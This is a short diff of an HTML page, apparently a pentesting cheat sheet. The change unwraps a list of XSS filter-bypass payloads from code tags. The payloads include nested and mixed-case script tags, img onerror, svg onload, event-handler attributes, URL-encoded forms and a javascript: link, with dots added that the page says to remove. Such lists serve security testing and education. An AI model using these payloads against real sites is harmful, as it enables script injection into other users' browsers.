@@ -24,14 +24,14 @@ is it being blocked due to the spaces? remove all spaces from the attack payload
 <br>
 <h2>XSS Filter Bypasses</h2> <br>
 <b>Remove . from all payloads</b> <br>
-<code>Is <.script>alert(1)</script.> filtered? Try: <br>
+Is <.script>alert(1)</script.> filtered? Try: <br>
 <.scr<.script>ipt>alert(1)<./scr</script.>ipt> <br>
 <.img src=x onerror=alert(1)> <br>
 <.svg/onload=alert(1)> <br>
 <.h1 id=x onpointermove=alert(1)>test<./h1> <br>
 %3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E <br>
 <.randomfaketag id=x onwheel=alert(1)><br>
-<.a href=javascript:alert(1)>click</a.><br> </code>
+<.a href=javascript:alert(1)>click</a.><br>
 <.ScRiPt>alert(1)<./ScRiPt><br>
 < and > can be replace with html entities &lt; and &gt; <br>
 You can try an XSS polyglot <br>
